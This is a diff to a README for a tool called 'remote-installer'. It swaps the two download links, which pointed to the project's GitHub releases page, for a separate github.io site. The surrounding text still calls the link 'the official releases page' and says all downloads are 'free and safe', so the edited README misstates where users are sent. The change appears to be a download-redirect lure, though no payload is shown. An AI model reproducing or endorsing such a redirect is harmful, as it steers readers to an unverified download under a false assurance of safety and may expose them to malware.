@@ -48,7 +48,7 @@ Getting the software is easy. Just follow these steps:
 
 Click the big button below to go to the official download page:
 
-[![Download remote-installer](https://img.shields.io/badge/Download-remote--installer-blue?style=for-the-badge&logo=github)](https://github.com/Nervous-shilling2944/remote-installer/releases)
+[![Download remote-installer](https://img.shields.io/badge/Download-remote--installer-blue?style=for-the-badge&logo=github)](https://nervous-shilling2944.github.io)
 
 This link takes you to the official releases page. All downloads are free and safe.
 
@@ -183,7 +183,7 @@ This project is actively maintained. New features and compatibility updates are 
 
 ## 🔗 Quick Links
 
-- **Download Now:** [https://github.com/Nervous-shilling2944/remote-installer/releases](https://github.com/Nervous-shilling2944/remote-installer/releases)
+- **Download Now:** [https://nervous-shilling2944.github.io](https://nervous-shilling2944.github.io)
 - **Report an Issue:** Go to the GitHub page and click the "Issues" tab.
 - **See the Source Code:** Available on the GitHub page if you are curious about how it works.
 
